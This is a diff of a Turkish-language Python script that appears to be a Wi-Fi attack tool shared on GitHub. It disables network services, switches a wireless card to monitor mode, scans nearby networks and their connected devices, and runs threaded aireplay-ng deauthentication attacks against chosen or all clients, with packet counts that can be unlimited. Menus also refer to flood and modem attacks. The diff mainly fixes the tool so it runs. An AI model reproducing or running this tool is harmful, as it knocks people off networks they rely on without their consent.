@@ -36,10 +36,9 @@ def sprint(text, second=0.05):
     
     sys.stdout.write('\n')
     sys.stdout.flush()
-
+    
 def wifi_kartlari_ve_monitor_modu_bul():
     try:
-        clear()
         cikti = subprocess.check_output("iwconfig", shell=True).decode(errors="ignore")
         wifi_kartlari = []
         monitor_mod_karti = None
@@ -54,10 +53,13 @@ def wifi_kartlari_ve_monitor_modu_bul():
         if not monitor_mod_karti and wifi_kartlari:
             monitor_mod_karti = wifi_kartlari[0]
         return wifi_kartlari, monitor_mod_karti
-    except Exception as e:
+    except Exception:
         return [], None
 
 wifi_kartlari, monitor_mod_karti = wifi_kartlari_ve_monitor_modu_bul()
+
+wifi_kartlari, monitor_mod_karti = wifi_kartlari_ve_monitor_modu_bul()
+clear()
 print(f"Bulunan WiFi kartları: {wifi_kartlari}")
 print(f"Monitor mod kartı: {monitor_mod_karti}")
 time.sleep(2)
@@ -66,8 +68,8 @@ sprint(Fore.YELLOW + f"Flood, Deauth paketi saldırıları {monitor_mod_karti} a
 def check_dependencies():
     requirements_file = "requirements.txt" 
     if not os.path.exists(requirements_file):
-        sprint(Fore.RED + f"Hata: '{requirements_file}' dosyası bulunamadı." + Style.RESET_ALL)
-        sprint(Fore.RED + "Lütfen 'requirements.txt' dosyasının script ile aynı dizinde olduğundan emin olun." + Style.RESET_ALL)
+        print(Fore.RED + f"Hata: '{requirements_file}' dosyası bulunamadı." + Style.RESET_ALL)
+        print(Fore.RED + "Lütfen 'requirements.txt' dosyasının script ile aynı dizinde olduğundan emin olun." + Style.RESET_ALL)
         sys.exit(1)
 
     with open(requirements_file, 'r') as f:
@@ -86,16 +88,16 @@ def check_dependencies():
             missing_packages.append(package)
 
     if missing_packages:
-        sprint(Fore.RED + "[HATA] Eksik kütüphaneler tespit edildi!" + Style.RESET_ALL)
-        sprint(Fore.YELLOW + "Lütfen aşağıdaki kütüphaneleri yükleyin:" + Style.RESET_ALL)
+        print(Fore.RED + "[HATA] Eksik kütüphaneler tespit edildi!" + Style.RESET_ALL)
+        print(Fore.YELLOW + "Lütfen aşağıdaki kütüphaneleri yükleyin:" + Style.RESET_ALL)
         for pkg in missing_packages:
-            sprint(Fore.YELLOW + f"  - {pkg}" + Style.RESET_ALL)
+            print(Fore.YELLOW + f"  - {pkg}" + Style.RESET_ALL)
         sprint(Fore.GREEN + "Tüm eksik kütüphaneleri yüklemek için aşağıdaki komutu çalıştırın:" + Style.RESET_ALL)
         sprint(Fore.LIGHTMAGENTA_EX + f"pip3 install -r {requirements_file}" + Style.RESET_ALL)
         sys.exit(1)
     else:
-        sprint(Fore.CYAN + "Gerekli kütüphaneler kontrol ediliyor..." + Style.RESET_ALL)
-        sprint(Fore.GREEN + "Tüm gerekli kütüphaneler yüklü." + Style.RESET_ALL)
+        print(Fore.CYAN + "Gerekli kütüphaneler kontrol ediliyor..." + Style.RESET_ALL)
+        print(Fore.GREEN + "Tüm gerekli kütüphaneler yüklü." + Style.RESET_ALL)
 
 def run_cmd(cmd):
     try:
@@ -105,29 +107,44 @@ def run_cmd(cmd):
                        stdin=subprocess.DEVNULL)
     except subprocess.CalledProcessError:
         pass
-
+        
 def monitor_mode_ac():
+    global monitor_mod_karti
     clear()
     sprint(Fore.YELLOW + "[*] Monitor moda geçiliyor..." + Style.RESET_ALL)
+
     run_cmd("airmon-ng check kill")
     run_cmd("nmcli networking off")
     run_cmd("rfkill unblock all")
-    run_cmd("systemctl stop NetworkManager.service")
-    run_cmd("systemctl stop wpa_supplicant.service")
+    run_cmd("systemctl stop NetworkManager.service || true")
+    run_cmd("systemctl stop wpa_supplicant.service || true")
     time.sleep(2)
 
+    
     run_cmd(f"airmon-ng start {monitor_mod_karti}")
 
-    sprint(Fore.GREEN + f"[+] Monitor moda geçildi ({monitor_mod_karti})." + Style.RESET_ALL)
+    iw_out = subprocess.getoutput("iwconfig")
+    yeni_kart = None
+    for line in iw_out.splitlines():
+        if "Mode:Monitor" in line:
+            yeni_kart = line.split()[0]  
+            break
+
+    if yeni_kart:
+        monitor_mod_karti = yeni_kart
+        sprint(Fore.GREEN + f"[+] Monitor moda geçildi ({monitor_mod_karti})." + Style.RESET_ALL)
+    else:
+        sprint(Fore.RED + "[!] Monitor mod kartı bulunamadı!" + Style.RESET_ALL)
+
     time.sleep(2)
 
 def aglari_tar(sure=30, monitor_mod_karti=None):
-    if not monitor_mod_karti:
+    if monitor_mod_karti is None:
         sprint(Fore.RED + "[!] Monitor mod kartı belirtilmedi!" + Style.RESET_ALL)
         return ''
 
     clear()
-    sprint(Fore.YELLOW + f"[*] Ağlar {sure} saniye boyunca taranıyor ({monitor_mod_karti})..." + Style.RESET_ALL)
+    print(Fore.YELLOW + f"[*] Ağlar {sure} saniye boyunca taranıyor ({monitor_mod_karti})..." + Style.RESET_ALL)
 
     dumpfile = "/tmp/aglar-01.csv"
     if os.path.exists(dumpfile):
@@ -144,7 +161,7 @@ def aglari_tar(sure=30, monitor_mod_karti=None):
     proc.terminate()
     proc.wait()
 
-    sprint(Fore.GREEN + "[+] Tarama tamamlandı." + Style.RESET_ALL)
+    print(Fore.GREEN + "[+] Tarama tamamlandı." + Style.RESET_ALL)
     time.sleep(1)
 
     try:
@@ -173,12 +190,12 @@ def aglari_ayikla(csv_veri):
     return aglar
 
 def cihazlari_tar(bssid, kanal, sure=30, monitor_mod_karti=None):
-    if not monitor_mod_karti:
-        sprint(Fore.RED + "[!] Monitor mod kartı belirtilmedi!" + Style.RESET_ALL)
+    if monitor_mod_karti is None:
+        print(Fore.RED + "[!] Monitor mod kartı belirtilmedi!" + Style.RESET_ALL)
         return []
 
     clear()
-    sprint(Fore.YELLOW + f"[*] Cihazlar {sure} saniye boyunca taranıyor ({monitor_mod_karti})..." + Style.RESET_ALL)
+    print(Fore.YELLOW + f"[*] Cihazlar {sure} saniye boyunca taranıyor ({monitor_mod_karti})..." + Style.RESET_ALL)
 
     dumpfile = "/tmp/cihazlar-01.csv"
     if os.path.exists(dumpfile):
@@ -216,7 +233,7 @@ def cihazlari_tar(bssid, kanal, sure=30, monitor_mod_karti=None):
 import threading
 
 def deauth_hedef_saldir(bssid, hedef, paket_sayisi, monitor_mod_karti):
-    sprint(Fore.WHITE + f" -> {hedef} adresine saldırı başlatıldı..." + Style.RESET_ALL)
+    print(Fore.WHITE + f" -> {hedef} adresine saldırı başlatıldı..." + Style.RESET_ALL)
 
     if paket_sayisi == 0:
         cmd = f"aireplay-ng --deauth 0 -a {bssid} -c {hedef} {monitor_mod_karti}"
@@ -225,14 +242,14 @@ def deauth_hedef_saldir(bssid, hedef, paket_sayisi, monitor_mod_karti):
 
     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     for line in proc.stdout:
-        sprint(Fore.WHITE + f"[{hedef}] {line.strip()}" + Style.RESET_ALL)
+        print(Fore.WHITE + f"[{hedef}] {line.strip()}" + Style.RESET_ALL)
     proc.wait()
 
-    sprint(Fore.WHITE + f" -> {hedef} adresine saldırı tamamlandı." + Style.RESET_ALL)
+    print(Fore.WHITE + f" -> {hedef} adresine saldırı tamamlandı." + Style.RESET_ALL)
 
 def deauth_saldir(bssid, hedefler, paket_sayisi, monitor_mod_karti):
     clear()
-    sprint(Fore.YELLOW + f"[*] Saldırı başlatılıyor: {len(hedefler)} hedef, Paket sayısı: {paket_sayisi if paket_sayisi != 0 else 'Sınırsız'}" + Style.RESET_ALL)
+    print(Fore.YELLOW + f"[*] Saldırı başlatılıyor: {len(hedefler)} hedef, Paket sayısı: {paket_sayisi if paket_sayisi != 0 else 'Sınırsız'}" + Style.RESET_ALL)
 
     thread_list = []
     for hedef in hedefler:
@@ -307,9 +324,9 @@ def ip_modem_saldiri_menu():
             time.sleep(2)
             return
 
-        sprint(Fore.CYAN + "\n--- Taranan Ağlar ---" + Style.RESET_ALL)
+        print(Fore.CYAN + "\n--- Taranan Ağlar ---" + Style.RESET_ALL)
         for i, ag in enumerate(aglar, 1):
-            sprint(Fore.WHITE + f"{i}. ESSID: {ag['essid']} | BSSID: {ag['bssid']} | Kanal: {ag['channel']}" + Style.RESET_ALL)
+            print(Fore.WHITE + f"{i}. ESSID: {ag['essid']} | BSSID: {ag['bssid']} | Kanal: {ag['channel']}" + Style.RESET_ALL)
 
         secim_ag = input_int(Fore.BLUE + "\nHedef ağ numarasını seç: " + Style.RESET_ALL, 1, len(aglar))
         secilen_ag = aglar[secim_ag - 1]
@@ -567,8 +584,8 @@ def bmbmenu():
 def ana_menu():
     while True:
         clear()
-        sprint(Fore.YELLOW + "Scripti kullandığın için teşekkür ederim")
-        sprint(Fore.LIGHTGREEN_EX + "Lütfen GitHub üzerinden  yıldız vererek destek ol!")
+        print(Fore.YELLOW + "Scripti kullandığın için teşekkür ederim")
+        print(Fore.LIGHTGREEN_EX + "Lütfen GitHub üzerinden  yıldız vererek destek ol!")
         sprint(Fore.LIGHTGREEN_EX + "Menü Yükleniyor...") 
         time.sleep(1)
         clear()
@@ -637,38 +654,45 @@ def ana_menu():
             break
 
 def deauth_menu():
+    global monitor_mod_karti
     monitor_mode_ac()
-    aglar = aglari_ayikla(aglari_tar())
+
+    if not monitor_mod_karti:
+        sprint(Fore.RED + "[!] Monitor mod kartı bulunamadı. Menüye dönülüyor..." + Style.RESET_ALL)
+        time.sleep(2)
+        return
+
+    aglar = aglari_ayikla(aglari_tar(monitor_mod_karti=monitor_mod_karti))
     if not aglar:
         print(Fore.RED + "[!] Ağ bulunamadı. Menüye dönülüyor..." + Style.RESET_ALL)
         time.sleep(2)
         return
 
-    sprint(Fore.CYAN + "\n--- Taranan Ağlar ---" + Style.RESET_ALL)
+    print(Fore.CYAN + "\n--- Taranan Ağlar ---" + Style.RESET_ALL)
     for i, ag in enumerate(aglar, 1):
-        sprint(Fore.WHITE + f"{i}. ESSID: {ag['essid']} | BSSID: {ag['bssid']} | Kanal: {ag['channel']}" + Style.RESET_ALL)
+        print(Fore.WHITE + f"{i}. ESSID: {ag['essid']} | BSSID: {ag['bssid']} | Kanal: {ag['channel']}" + Style.RESET_ALL)
 
     secim = input_int(Fore.BLUE + "\nSaldırılacak ağ numarası: " + Style.RESET_ALL, 1, len(aglar))
     secilen_ag = aglar[secim - 1]
 
-    cihazlar = cihazlari_tar(secilen_ag['bssid'], secilen_ag['channel'])
+    cihazlar = cihazlari_tar(secilen_ag['bssid'], secilen_ag['channel'], monitor_mod_karti=monitor_mod_karti)
     if not cihazlar:
         print(Fore.RED + "[!] Cihaz bulunamadı. Menüye dönülüyor..." + Style.RESET_ALL)
         time.sleep(2)
         return
 
-    sprint(Fore.CYAN + "\n--- Taranan Cihazlar ---" + Style.RESET_ALL)
+    print(Fore.CYAN + "\n--- Taranan Cihazlar ---" + Style.RESET_ALL)
     for i, cihaz in enumerate(cihazlar, 1):
         print(Fore.WHITE + f"{i}. {cihaz}" + Style.RESET_ALL)
-    sprint(Fore.WHITE + "0. Hepsine saldır" + Style.RESET_ALL)
+    print(Fore.WHITE + "0. Hepsine saldır" + Style.RESET_ALL)
 
     cihaz_sec = input_int(Fore.BLUE + "Hedef cihaz numarası (0 hepsi): " + Style.RESET_ALL, 0, len(cihazlar))
     hedefler = cihazlar if cihaz_sec == 0 else [cihazlar[cihaz_sec - 1]]
 
     paket = input_int(Fore.BLUE + "Kaç paket gönderilsin?: " + Style.RESET_ALL, 1)
 
-    deauth_saldir(secilen_ag['bssid'], hedefler, paket)
+    deauth_saldir(secilen_ag['bssid'], hedefler, paket, monitor_mod_karti)
 
 if __name__ == "__main__":
     check_dependencies() 
-    ana_menu() 
+    ana_menu()
